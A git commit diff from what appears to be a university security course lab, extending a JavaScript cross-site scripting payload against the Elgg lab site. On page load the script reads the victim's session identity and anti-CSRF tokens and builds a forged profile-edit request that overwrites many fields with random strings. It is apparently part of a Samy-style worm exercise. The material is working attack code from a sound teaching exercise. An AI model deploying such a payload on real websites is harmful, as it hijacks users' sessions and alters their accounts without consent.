7f967a3f08d81d54daaecb350a3faee979f28b5c
Mahathir <mirmahathir1@gmail.com>
2021-06-24 23:39:25 +0600

    xss: added more fields to edit route

--- level4term1/Security/xss/1605011_/1605011_Task_2.js
+++ level4term1/Security/xss/1605011_/1605011_Task_2.js
@@ -1,12 +1,29 @@
+function randomString(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {result += characters.charAt(Math.floor(Math.random() * charactersLength));}
+    return result;
+}
+
 window.onload = function () {
     var name = elgg.session.user.name;
     var guid = "&guid="+elgg.session.user.guid;
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    var briefDesc = "&briefdescription=1605011"+"&accesslevel[briefdescription]=2";
-    
+    var briefDesc = "&briefdescription=1605011"+"&accesslevel[briefdescription]=1";
+    var description = "&description="+randomString(10)+"&accesslevel[description]=1";
+    var contactemail = "&contactemail="+randomString(10)+"&accesslevel[contactemail]=1";
+    var interests = "&interests="+randomString(10)+"&accesslevel[interests]=1";
+    var location = "&location="+randomString(10)+"&accesslevel[location]=1";
+    var mobile = "&mobile="+randomString(10)+"&accesslevel[mobile]=1";
+    var phone = "&phone="+randomString(10)+"&accesslevel[phone]=1";
+    var skills = "&skills="+randomString(10)+"&accesslevel[skills]=1";
+    var twitter = "&twitter="+randomString(10)+"&accesslevel[twitter]=1";
+    var website = "&website="+randomString(10)+"&accesslevel[website]=1";
+
     var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
-    var content = name + guid + ts + token + briefDesc;
+    var content = name + guid + ts + token + briefDesc + description + contactemail + interests + location + mobile + phone + skills + twitter + website;
     
     var samyGuid = 47;
 
